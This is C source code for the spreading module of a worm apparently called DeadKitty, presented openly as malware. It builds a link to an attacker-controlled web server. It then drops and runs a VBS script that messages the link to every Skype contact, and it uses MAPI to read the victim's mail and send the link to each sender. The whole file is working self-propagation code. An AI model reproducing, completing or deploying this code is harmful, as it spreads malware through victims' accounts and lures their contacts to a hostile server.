   /* The spammer module */

   #include "DeadKitty.h"

   /* build the evil url */
   char *getURL(void)
   {
       char *url = GlobalAlloc(GMEM_ZEROINIT|GMEM_FIXED,80);
       sprintf(url,"http://%s:%d",GlobalIP,EVIL_WEBSERVER_PORT);
       return url;
   }

   /* this drops a simple skype IM spammer and execute it */
   DWORD WINAPI Th_SkypeSPAM(LPVOID Data)
   {
       char IMDrop[MAX_PATH];
       char url[80];
       HANDLE IMfd = NULL;
       DWORD WrittenBytes;

       sprintf(IMDrop,"%s\\DeadKittySpammer.vbs",SysDir);

       /* drop the vbs script */
       IMfd = CreateFile(IMDrop,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,
           FILE_ATTRIBUTE_NORMAL,NULL);

       if(IMfd == INVALID_HANDLE_VALUE)
       {
           ExitThread(0);
       }

       /* write it */
   #define WRITELINE(x) WriteFile(IMfd,x,strlen(x),&WrittenBytes,NULL)

       WRITELINE("on error resume next\r\n");
       WRITELINE("set ZsrVV = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")\r\n");
       WRITELINE("ZsrVV.Client.Start()\r\n");
       WRITELINE("ZsrVV.Attach()\r\n");
       WRITELINE("For Each KZF In ZsrVV.Friends\r\n");
       sprintf(url,"ZsrVV.SendMessage KZF.handle,\"DeadKitty is here! %s\"\r\n",getURL());
       WRITELINE(url);
       WRITELINE("wscript.Sleep 480000\r\n");
       WRITELINE("next");


       CloseHandle(IMfd);

       /* execute it! */
       ShellExecute(NULL,"open",IMDrop,NULL,NULL,SW_SHOW);
   }

   /*** Use MAPI interface to send mails with our evil url ****/
   void Send(char *addr,LPMAPISENDMAIL SendMail,LHANDLE lhSession)
   {
       MapiRecipDesc *recips  = (MapiRecipDesc *)GlobalAlloc(GMEM_ZEROINIT|GMEM_FIXED,
           sizeof(MapiRecipDesc));
       char msg[32];

       MapiMessage note = {0,"DeadKitty is here!",getURL(),NULL,NULL,NULL,0,NULL,1,recips,0,NULL};
       recips->ulReserved = 0;
       recips->ulRecipClass = MAPI_TO;
       recips->lpszName     = addr;
       recips->lpszAddress  = addr;
       recips->ulEIDSize    = 0;
       recips->lpEntryID    = NULL;

       /* send it */
       SendMail(lhSession, 0L, &note, 0L, 0L);
       GlobalFree(recips);
   }

   DWORD WINAPI Th_MapiSPAM(LPVOID Data)
   {
       CHAR rgchMsgID[513];
       MapiMessage *lpMessage;
       HINSTANCE hi;
       LPMAPILOGON MAPILogon;
       LPMAPIFINDNEXT MAPIFindNext;
       LPMAPIREADMAIL MAPIReadMail;
       LPMAPISENDMAIL MAPISendMail;
       LPMAPILOGOFF MAPILogoff;
       LHANDLE lhSession;

       if(!(hi = LoadLibrary( "mapi32.dll" )))
       {
           ExitThread(0);
       }


       MAPILogon = (LPMAPILOGON)GetProcAddress( hi, "MAPILogon");
       MAPIFindNext = (LPMAPIFINDNEXT)GetProcAddress( hi, "MAPIFindNext");
       MAPIReadMail = (LPMAPIREADMAIL)GetProcAddress( hi, "MAPIReadMail");
       MAPISendMail = (LPMAPISENDMAIL)GetProcAddress( hi, "MAPISendMail");
       MAPILogoff = (LPMAPILOGOFF)GetProcAddress(hi,"MAPILogoff");

       if(MAPILogon == NULL || MAPIFindNext == NULL || MAPIReadMail == NULL
           || MAPISendMail == NULL || MAPILogoff == NULL)
       {
           ExitThread(0);
       }


       if(MAPILogon(0,NULL,NULL,0,0,&lhSession) == SUCCESS_SUCCESS)
       {
           *rgchMsgID = NULL;

           while(1)
           {
               if(MAPIFindNext( lhSession, 0L, NULL, rgchMsgID, MAPI_LONG_MSGID,
                   0L, rgchMsgID) != SUCCESS_SUCCESS)
               {
                   break;
               }

               if(MAPIReadMail( lhSession, 0L, rgchMsgID, MAPI_PEEK, 0L, &lpMessage)
                   == SUCCESS_SUCCESS)
               {

                   Send(lpMessage->lpOriginator->lpszAddress,MAPISendMail,lhSession);
                   WAIT(15); /* wait 15 minutes */

               }

           }

           MAPILogoff(lhSession,0L,0L,0L);

       }

       /* free */
       FreeLibrary(hi);
   }

   void LinkSPAM(void)
   {
       DWORD SkypeSPAMId,MapiSPAMId;


       if(MyRand())
       {
           CreateThread(NULL,0,&Th_MapiSPAM,0,0,&MapiSPAMId);
       }

       else
       {
           CreateThread(NULL,0,&Th_SkypeSPAM,0,0,&SkypeSPAMId);
       }
   }
